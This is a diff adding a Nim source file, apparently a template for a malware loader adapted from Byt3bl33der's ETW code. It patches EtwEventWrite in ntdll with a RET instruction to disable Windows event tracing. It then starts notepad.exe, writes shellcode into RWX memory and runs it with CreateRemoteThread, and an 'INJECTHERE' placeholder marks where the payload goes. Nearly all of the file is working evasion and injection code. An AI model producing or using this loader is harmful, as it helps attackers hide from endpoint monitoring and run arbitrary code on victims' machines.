@@ -1,0 +1,111 @@
+# Adapted from Byt3bl33der's ETW code.
+import winim/lean
+import strformat
+import dynlib
+import osproc
+
+# 0xc3 = RET in assembly
+const patch: array[1, byte] = [byte 0xc3]
+
+proc Patchntdll(): bool =
+    var
+        ntdll: LibHandle
+        etwPointer: pointer
+        origProtect: DWORD
+        trash: DWORD
+        disabled: bool = false
+
+    ntdll = loadLib("ntdll")
+    if isNil(ntdll):
+        echo "[X] Failed to load ntdll.dll"
+        return disabled
+
+    etwPointer = ntdll.symAddr("EtwEventWrite") 
+    if isNil(etwPointer):
+        echo "[X] Failed to get the address of 'EtwEventWrite'"
+        return disabled
+
+    if VirtualProtect(etwPointer, patch.len, PAGE_EXECUTE_READ_WRITE, addr origProtect):
+        echo "[*] Applying patch"
+        copyMem(etwPointer, unsafeAddr patch, patch.len)
+        VirtualProtect(etwPointer, patch.len, origProtect, addr trash)
+        disabled = true
+
+    return disabled
+
+
+proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
+
+    # startProcess creates a process using the osproc module
+    let tProcess = startProcess("notepad.exe")
+
+    #suspends the process. The defer means if any of the below fails
+    #then close the process out 
+
+    tProcess.suspend() 
+    defer: tProcess.close()
+
+    echo "[*] Target Process: ", tProcess.processID
+
+    #opens the process with all access, allowing us to inject threads
+    let pHandle = OpenProcess(
+        PROCESS_ALL_ACCESS, 
+        false, 
+        cast[DWORD](tProcess.processID)
+    )
+    defer: CloseHandle(pHandle)
+
+    echo "[*] pHandle: ", pHandle
+
+    # Create shellcode memory. Shellcode is RWX until we are done copying
+    let rPtr = VirtualAllocEx(
+        pHandle,
+        NULL,
+        cast[SIZE_T](shellcode.len),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READ_WRITE
+    )
+
+    # copy the shellcode into memory
+    var bytesWritten: SIZE_T
+    let wSuccess = WriteProcessMemory(
+        pHandle, 
+        rPtr,
+        unsafeAddr shellcode,
+        cast[SIZE_T](shellcode.len),
+        addr bytesWritten
+    )
+    var origProtect: DWORD
+    VirtualProtect(
+        rPtr, 
+        cast[SIZE_T](shellcode.len), 
+        PAGE_EXECUTE_READ, 
+        addr origProtect
+    )
+
+    echo "[*] WriteProcessMemory: ", bool(wSuccess)
+    echo "    \\-- bytes written: ", bytesWritten
+    echo ""
+
+    
+    let tHandle = CreateRemoteThread(
+        pHandle, 
+        NULL,
+        0,
+        cast[LPTHREAD_START_ROUTINE](rPtr),
+        NULL, 
+        0, 
+        NULL
+    )
+    defer: CloseHandle(tHandle)
+
+    echo "[*] tHandle: ", tHandle
+    echo "[+] Injected"
+
+INJECTHERE
+
+    # This is essentially the equivalent of 'if __name__ == '__main__' in python
+when isMainModule:
+    var success = Patchntdll()
+    echo fmt"[*] ETW blocked by patch: {bool(success)}"
+    injectCreateRemoteThread(shellcode)
